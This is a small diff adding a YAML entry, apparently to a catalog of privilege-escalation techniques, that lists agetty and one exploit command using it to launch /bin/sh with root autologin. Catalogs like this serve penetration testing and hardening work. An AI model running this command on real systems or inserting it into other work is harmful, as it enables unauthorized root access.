@@ -1,0 +1,4 @@
+name: agetty
+binary_path: /usr/bin/agetty
+exploit_cmds:
+- /usr/bin/agetty -l /bin/sh -o -p -a root tty
